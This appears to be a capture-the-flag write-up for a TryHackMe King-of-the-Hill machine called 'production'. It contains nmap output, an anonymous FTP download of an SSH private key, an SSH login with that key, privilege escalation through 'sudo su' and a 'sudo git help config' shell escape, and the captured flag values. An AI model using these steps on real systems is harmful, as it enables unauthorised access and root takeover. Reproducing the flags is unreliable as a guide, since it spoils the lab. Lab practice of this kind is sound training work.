

THM-KOTH:	production
============================

> labruhtooryboi | December 14, 2020


# 10.10.113.255
# production.thm


					# reconnisance

'''
Open 10.10.113.255:21
Open 10.10.113.255:22
Open 10.10.113.255:139
Open 10.10.113.255:445
Open 10.10.113.255:9002
Open 10.10.113.255:9001
Open 10.10.113.255:9999
'''

'''
Nmap scan report for 10.10.113.255
Host is up (0.39s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d3:4a:2e:ae:df:db:e1:1b:c1:62:2b:ce:15:00:73:6e (RSA)
|   256 2e:63:62:b7:95:16:ea:0a:01:0e:12:ef:66:21:23:0b (ECDSA)
|_  256 20:fe:a0:ce:52:f9:35:7b:8a:7a:d0:ee:c1:41:96:90 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
9001/tcp open  tor-orport?
| fingerprint-strings: 
|   GenericLines, GetRequest, JavaRMI, Radmin: 
|     ================================================
|     Ashu's Password Protected Backdoor 
|     ================================================
|     Password Incorrect
|   NULL, SSLSessionReq, SSLv23SessionReq, TLSSessionReq, mongodb: 
|     ================================================
|     Ashu's Password Protected Backdoor 
|_    ================================================
9002/tcp open  dynamid?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RTSPRequest: 
|     Overly Limited Shell
|     Segfault
|   GenericLines, Help: 
|     Overly Limited Shell
|     Command Executed
|   NULL, RPCCheck, SSLSessionReq: 
|_    Overly Limited Shell
9999/tcp open  http        Golang net/http server
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Date: Mon, 14 Dec 2020 18:40:12 GMT
|     Content-Length: 1
|     Content-Type: text/plain; charset=utf-8
|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Date: Mon, 14 Dec 2020 18:40:11 GMT
|     Content-Length: 1
|     Content-Type: text/plain; charset=utf-8
|   OfficeScan: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain
|     Connection: close
|_    Request: missing required Host header
| http-methods: 
|_  Supported Methods: POST OPTIONS
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
3 services unrecognized despite returning data.
'''



					# enumeration

'''
ftp 10.10.113.255

get flag.txt
get id_rsa
get id_rsa.pub
'''



					# exploitation

'''
chmod 400 id_rsa
'''

'''
ssh -i id_rsa ashu@10.10.113.255
'''


					# privelage escalation
					
'''
*su

sudo su skidy
'''



'''
*git

sudo git help config
!/bin/sh
'''


					# interesting things

>flags
'''
anon ftp
cde6951cf12ff485d6d33ad7a2e6ac49
'''

'''
/home/ashu
04461ad0759944a4d743deec6bbd8d54
'''

'''
/home/skidy
eabe4da21f519b8d6726427df7e683c5
'''


>users
'''
root
skidy
ashu
'''

>passwds
'''
none
'''


>files and dirs
'''
/usr/bin/su
'''

'''
/usr/bin/git
'''


>root stuff 
'''
(to many passwd changes to get original passwd and shadow file)
'''

'''
'''
